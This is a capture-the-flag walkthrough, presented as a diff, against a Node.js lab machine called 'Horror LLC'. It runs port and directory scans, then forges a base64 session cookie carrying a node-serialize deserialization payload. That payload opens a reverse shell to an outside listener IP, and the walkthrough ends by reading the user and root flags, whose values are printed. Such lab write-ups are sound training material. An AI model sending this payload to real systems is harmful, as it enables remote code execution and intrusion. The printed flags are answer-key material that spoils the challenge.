@@ -1,0 +1,501 @@
+JAX SUCKS ALOT.
+
+
+
+
+[ENUMERATION: PORTS]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.247.48
+[OUTPUT]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.95%I=7%D=7/29%Time=6888F789%P=x86_64-pc-linux-gnu%r(GetR
+...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+[RECON: exploring http://10.10.247.48/]
+[OUTPUT]
+Horror LLC
+Built with Nodejs
+Coming soon! Please sign up to our newsletter to receive updates.
+Email address:
+Submit
+
+
+
+
+[ENUMERATION: directories]
+[ACTION: gobuster quick scan for common directories]
+gobuster dir -u http://10.10.247.48/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.247.48/2dea9b49-5d4d-438c-b17b-043a6ab58730 => 200 (Length: 3559). To continue please exclude the status code or the length
+
+
+[ACTION: retry las scan, excluding length 3559]
+gobuster dir -u http://10.10.247.48/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --exclude-length 3559
+[NOTE]
+Found no directories.
+All requests return 200 ok, length 3359.
+
+
+[ACTION: check for (likely) non-existent path]
+curl -i http://10.10.247.48/aiblclwemfkxbvbjzodfs
+[NOTE]
+Same site as http://10.10.247.48/
+
+
+[ACTION: check for (likely) existent path]
+curl -i http://10.10.247.48/admin
+[NOTE]
+Same as last curl.
+
+
+
+
+[RECON: exploring http://10.10.247.48/]
+[ACTION: check source]
+ctrl + u
+[OUTPUT (snippet)]
+   <a class="button-line" id="signup">Submit</a> 
+    <script>
+    document.getElementById("signup").addEventListener("click", function() {
+	var date = new Date();
+    	date.setTime(date.getTime()+(-1*24*60*60*1000));
+    	var expires = "; expires="+date.toGMTString();
+    	document.cookie = "session=foobar"+expires+"; path=/";
+    	const Http = new XMLHttpRequest();
+        console.log(location);
+        const url=window.location.href+"?email="+document.getElementById("fname").value;
+        Http.open("POST", url);
+        Http.send();
+	setTimeout(function() {
+		window.location.reload();
+	}, 500);
+    }); 
+    </script>
+[NOTE]
+Based on const url, if I visit http://10.10.247.48/, it sends post to http://10.10.247.48/?email=anything.
+
+
+[ACTION: run curl and check differences]
+curl -i -X POST "http://10.10.247.48/?email=test@a.com"
+[OUTPUT]
+HTTP/1.1 200 OK
+Set-Cookie: session=eyJlbWFpbCI6InRlc3RAYS5jb20ifQ==; Max-Age=900000; HttpOnly, Secure
+Content-Type: text/html
+Date: Tue, 29 Jul 2025 16:44:12 GMT
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+<html><head>
+<title>Horror LLC</title>
+<style>
+  body {
+    background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
+    background-size: 300% 300%;
+    -webkit-animation: Background 10s ease infinite;
+    -moz-animation: Background 10s ease infinite;
+    animation: Background 10s ease infinite;
+  }
+  
+  @-webkit-keyframes Background {
+    0% {
+      background-position: 0% 50%
+    }
+    50% {
+      background-position: 100% 50%
+    }
+    100% {
+      background-position: 0% 50%
+    }
+  }
+  
+  @-moz-keyframes Background {
+    0% {
+      background-position: 0% 50%
+    }
+    50% {
+      background-position: 100% 50%
+    }
+    100% {
+      background-position: 0% 50%
+    }
+  }
+  
+  @keyframes Background {
+    0% {
+      background-position: 0% 50%
+    }
+    50% {
+      background-position: 100% 50%
+    }
+    100% {
+      background-position: 0% 50%
+    }
+  }
+  
+  .full-screen {
+    position: fixed;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+    background-size: cover;
+    background-position: center;
+    width: 100%;
+    height: 100%;
+    display: -webkit-flex;
+    display: flex;
+    -webkit-flex-direction: column
+    /* works with row or column */
+    
+    flex-direction: column;
+    -webkit-align-items: center;
+    align-items: center;
+    -webkit-justify-content: center;
+    justify-content: center;
+    text-align: center;
+  }
+  
+  h1 {
+    color: #fff;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: 800;
+    font-size: 4em;
+    letter-spacing: -2px;
+    text-align: center;
+    text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);
+  }
+  
+  h3 {
+    color: #fff;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: 800;
+    font-size: 2em;
+    letter-spacing: -2px;
+    text-align: center;
+    text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);
+  }
+  
+  h2 {
+    color: #fff;
+    font-weight: 10;
+    letter-spacing: 1px;
+    text-align: center;
+    text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);
+  }
+ 
+ h4 {
+    color: #fff;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: 800;
+    font-size: 1em;
+    letter-spacing: -1px;
+    text-align: center;
+    text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);  
+ }
+  
+  .button-line {
+    font-family: 'Open Sans', sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    background: transparent;
+    border: 1px solid #fff;
+    color: #fff;
+    text-align: center;
+    font-size: 1.4em;
+    opacity: .8;
+    padding: 20px 40px;
+    text-decoration: none;
+    transition: all .5s ease;
+    margin: 0 auto;
+    display: block;
+    width: 100px;
+  }
+  
+  .button-line:hover {
+    opacity: 1;
+  }
+
+  </style>
+</head>
+<body>
+	<div class="full-screen">
+  <div>
+    <h1>Horror LLC</h1>
+    <h4>Built with Nodejs</h4>
+    <br>
+    <h3>Coming soon! Please sign up to our newsletter to receive updates.</h3>
+    <br>
+    <h2>Email address:</h2>
+    <input type="text" id="fname" name="fname"><br><br>
+    <a class="button-line" id="signup">Submit</a> 
+    <script>
+    document.getElementById("signup").addEventListener("click", function() {
+	var date = new Date();
+    	date.setTime(date.getTime()+(-1*24*60*60*1000));
+    	var expires = "; expires="+date.toGMTString();
+    	document.cookie = "session=foobar"+expires+"; path=/";
+    	const Http = new XMLHttpRequest();
+        console.log(location);
+        const url=window.location.href+"?email="+document.getElementById("fname").value;
+        Http.open("POST", url);
+        Http.send();
+	setTimeout(function() {
+		window.location.reload();
+	}, 500);
+    }); 
+    </script>
+  </div>
+</div>
+
+
+</body></html>
+HTTP/1.1 200 OK
+Set-Cookie: session=eyJlbWFpbCI6InRlc3RAYS5jb20ifQ==; Max-Age=900000; HttpOnly, Secure
+Content-Type: text/html
+Date: Tue, 29 Jul 2025 16:44:12 GMT
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+<html><head>
+<title>Horror LLC</title>
+<style>
+  body {
+    background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
+    background-size: 300% 300%;
+    -webkit-animation: Background 10s ease infinite;
+    -moz-animation: Background 10s ease infinite;
+    animation: Background 10s ease infinite;
+  }
+  
+  @-webkit-keyframes Background {
+    0% {
+      background-position: 0% 50%
+    }
+    50% {
+      background-position: 100% 50%
+    }
+    100% {
+      background-position: 0% 50%
+    }
+  }
+  
+  @-moz-keyframes Background {
+    0% {
+      background-position: 0% 50%
+    }
+    50% {
+      background-position: 100% 50%
+    }
+    100% {
+      background-position: 0% 50%
+    }
+  }
+  
+  @keyframes Background {
+    0% {
+      background-position: 0% 50%
+    }
+    50% {
+      background-position: 100% 50%
+    }
+    100% {
+      background-position: 0% 50%
+    }
+  }
+  
+  .full-screen {
+    position: fixed;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+    background-size: cover;
+    background-position: center;
+    width: 100%;
+    height: 100%;
+    display: -webkit-flex;
+    display: flex;
+    -webkit-flex-direction: column
+    /* works with row or column */
+    
+    flex-direction: column;
+    -webkit-align-items: center;
+    align-items: center;
+    -webkit-justify-content: center;
+    justify-content: center;
+    text-align: center;
+  }
+  
+  h1 {
+    color: #fff;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: 800;
+    font-size: 4em;
+    letter-spacing: -2px;
+    text-align: center;
+    text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);
+  }
+  
+  h3 {
+    color: #fff;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: 800;
+    font-size: 2em;
+    letter-spacing: -2px;
+    text-align: center;
+    text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);
+  }
+  
+  h2 {
+    color: #fff;
+    font-weight: 10;
+    letter-spacing: 1px;
+    text-align: center;
+    text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);
+  }
+ 
+ h4 {
+    color: #fff;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: 800;
+    font-size: 1em;
+    letter-spacing: -1px;
+    text-align: center;
+    text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);  
+ }
+  
+  .button-line {
+    font-family: 'Open Sans', sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    background: transparent;
+    border: 1px solid #fff;
+    color: #fff;
+    text-align: center;
+    font-size: 1.4em;
+    opacity: .8;
+    padding: 20px 40px;
+    text-decoration: none;
+    transition: all .5s ease;
+    margin: 0 auto;
+    display: block;
+    width: 100px;
+  }
+  
+  .button-line:hover {
+    opacity: 1;
+  }
+
+  </style>
+</head>
+<body>
+	<div class="full-screen">
+  <div>
+    <h1>Horror LLC</h1>
+    <h4>Built with Nodejs</h4>
+    <br>
+    <h3>Coming soon! Please sign up to our newsletter to receive updates.</h3>
+    <br>
+    <h2>Email address:</h2>
+    <input type="text" id="fname" name="fname"><br><br>
+    <a class="button-line" id="signup">Submit</a> 
+    <script>
+    document.getElementById("signup").addEventListener("click", function() {
+	var date = new Date();
+    	date.setTime(date.getTime()+(-1*24*60*60*1000));
+    	var expires = "; expires="+date.toGMTString();
+    	document.cookie = "session=foobar"+expires+"; path=/";
+    	const Http = new XMLHttpRequest();
+        console.log(location);
+        const url=window.location.href+"?email="+document.getElementById("fname").value;
+        Http.open("POST", url);
+        Http.send();
+	setTimeout(function() {
+		window.location.reload();
+	}, 500);
+    }); 
+    </script>
+  </div>
+</div>
+
+
+</body></html>
+[NOTE]
+We found a session cookie: eyJlbWFpbCI6InRlc3RAYS5jb20ifQ==
+
+
+[ACTION: decode cookie (base64)]
+echo 'eyJlbWFpbCI6InRlc3RAYS5jb20ifQ==' | base64 -d
+[OUTPUT]
+{"email":"test@a.com"}
+[NOTE]
+Our previous decode shows the session cookies aren't protected, just encoded.
+This means we can do session forgery to privesc.
+
+
+
+
+[EXPLOIT: gain user access]
+[NOTE]
+We will attempt a rev shell, where we set a function as the email value.
+Decoded payload:
+{"email":"_$$ND_FUNC$$_function(){ var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []); var client = new net.Socket(); client.connect(9999, '10.23.25.109', function() { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; }()"}
+[ACTION: encode the payload]
+[OUTPUT]
+eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpeyB2YXIgbmV0ID0gcmVxdWlyZSgnbmV0JyksIGNwID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLCBzaCA9IGNwLnNwYXduKCcvYmluL3NoJywgW10pOyB2YXIgY2xpZW50ID0gbmV3IG5ldC5Tb2NrZXQoKTsgY2xpZW50LmNvbm5lY3QoOTk5OSwgJzEwLjIzLjI1LjEwOScsIGZ1bmN0aW9uKCkgeyBjbGllbnQucGlwZShzaC5zdGRpbik7IHNoLnN0ZG91dC5waXBlKGNsaWVudCk7IHNoLnN0ZGVyci5waXBlKGNsaWVudCk7IH0pOyByZXR1cm4gL2EvOyB9KCkifQo=
+
+
+[ACTION: spawn shell]
+curl -i -H "Cookie: session=eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpeyB2YXIgbmV0ID0gcmVxdWlyZSgnbmV0JyksIGNwID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLCBzaCA9IGNwLnNwYXduKCcvYmluL3NoJywgW10pOyB2YXIgY2xpZW50ID0gbmV3IG5ldC5Tb2NrZXQoKTsgY2xpZW50LmNvbm5lY3QoOTk5OSwgJzEwLjIzLjI1LjEwOScsIGZ1bmN0aW9uKCkgeyBjbGllbnQucGlwZShzaC5zdGRpbik7IHNoLnN0ZG91dC5waXBlKGNsaWVudCk7IHNoLnN0ZGVyci5waXBlKGNsaWVudCk7IH0pOyByZXR1cm4gL2EvOyB9KCkifQo==" http://10.10.247.48
+
+
+[ACTION: stabilize shell]
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+ctrl + z
+stty raw -echo; fg
+
+
+[ACTION: find user flag]
+find / -name "user.txt" 2>/dev/null
+[OUTPUT]
+/home/dylan/user.txt
+
+
+[ACTION: read user flag]
+cat /home/dylan/user.txt
+[OUTPUT]
+0ba48780dee9f5677a4461f588af217c
+
+
+
+
+[PRIVESC: analyze possible privesc options]
+[ACTION: check user sudo permissions]
+sudo -l
+[OUTPUT]
+atching Defaults entries for ubuntu on ip-10-10-247-48:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ubuntu may run the following commands on ip-10-10-247-48:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+[NOTE]
+Looks like we don't need to privesc.
+
+
+[ACTION: display root flag]
+sudo cat /root/root.txt
+[OUTPUT]
+2cd5a9fd3a0024bfa98d01d69241760e
+ 
+
+
